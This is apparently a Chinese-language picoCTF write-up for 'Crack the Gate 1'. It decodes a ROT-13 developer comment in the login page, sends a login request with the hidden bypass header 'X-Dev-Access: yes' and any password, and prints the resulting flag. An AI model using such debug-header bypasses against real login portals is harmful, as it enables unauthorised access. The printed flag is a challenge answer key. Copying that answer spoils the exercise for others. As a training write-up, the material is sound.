# Crack the Gate 1

我们正在调查一起案件。我们的一名调查对象 ctf player，据信在某个受限的 Web 门户中藏有敏感数据。我们已经查到了他用于登录的电子邮箱：[`ctf-player@picoctf.org`](mailto:ctf-player@picoctf.org)。遗憾的是，我们不知道密码，常用的猜解手段也都不起作用。但总觉得哪里不对劲……仿佛开发者留下了一条秘密进入途径。你能找出它吗？


## 侦察

- 响应
    ```html

    <!-- Remove before pushing to production! -->

    <form id="loginForm">
        <h2 style="font-size: 24px; margin-bottom: 24px;">
            Login

    </form>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const formData = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(formData)
                })
                .then(response => response.json())
                .then(data => {
                    console.log(data);
                    if (data.success) {
                        prompt('Login successful!\nFlag:', data.flag);
                    } else {
                        alert('Invalid credentials');
                    }

                })
                .catch(error => console.error('Error:', error));
        });
    </script>
    ```

特异注释似乎为字符翻转加密
- 使用[在线工具分析](https://www.dcode.fr/cipher-identifier)
    - 似乎为 `ROT-13 Cipher` 加密
    - 解密后得到明文
        ```log
        NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
        ```

基于特异注释，设置浏览器头部
- 请求
    ```http
    POST /login HTTP/1.1
    X-Dev-Access: yes

    {
        "email": "ctf-player@picoctf.org",
        "password": "any"
    }
    ```

- 响应
    ```json
    {
        "success": true,
        "email": "ctf-player@picoctf.org",
        "firstName": "pico",
        "lastName": "player",
        "flag": "picoCTF{brut4_f0rc4_49d1d186}"
    }
    ```
